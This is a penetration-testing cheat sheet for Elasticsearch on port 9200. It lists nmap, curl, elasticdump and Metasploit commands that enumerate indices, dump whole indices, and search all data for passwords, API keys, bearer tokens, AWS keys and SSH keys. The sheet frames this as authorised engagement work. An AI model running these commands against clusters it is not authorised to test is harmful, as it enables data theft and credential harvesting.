# Elasticsearch (9200)

!!! tip "Start here"
    Test both HTTP and HTTPS. A JSON banner confirms Elasticsearch; it does not prove access to every index. Elasticsearch 8.x enables authentication and TLS automatically, while older or explicitly unsecured clusters may allow anonymous API access.

---

## Enumeration

```bash
nmap -p 9200 -sV --script http-enum $IP
curl -s "http://$IP:9200/"                         # cluster banner, version
curl -sk "https://$IP:9200/"                       # current secured deployments commonly use TLS
curl -s "http://$IP:9200/_cluster/health"          # cluster state
curl -s "http://$IP:9200/_cat/indices?v"           # list all indices
curl -s "http://$IP:9200/_cat/nodes?v"             # cluster nodes
```

---

## Dumping Data

Dump an entire index (up to 10k hits per request):

```bash
curl -s "http://$IP:9200/$INDEX/_search?size=10000&pretty" > index_dump.json
```

Search for specific content across all indices:

```bash
curl -s "http://$IP:9200/_search?q=password&size=100&pretty"
curl -s "http://$IP:9200/_search?q=api_key&pretty"
```

For large indices, use the scroll API or `elasticdump`:

```bash
elasticdump --input="http://$IP:9200/$INDEX" --output=index.json --type=data
```

---

## Authenticated Access

If basic auth is enabled:

```bash
curl -u "elastic:$PASSWORD" "http://$IP:9200/_cat/indices?v"
```

Use approved credentials from the engagement rather than assuming historical defaults. Current installations generate credentials during security setup.

---

## Credential and Secret Hunting

Logs and application indices can contain tokens, headers, or credentials. Search only indices approved for collection and minimize exported data:

```bash
# Common fields to search
curl -s "http://$IP:9200/_search?q=authorization&pretty"
curl -s "http://$IP:9200/_search?q=bearer&pretty"
curl -s "http://$IP:9200/_search?q=aws_access_key&pretty"
curl -s "http://$IP:9200/_search?q=ssh-rsa&pretty"
```

---

## Metasploit Module

```bash
msfconsole
use auxiliary/scanner/elasticsearch/indices_enum
set RHOSTS $IP
run
```
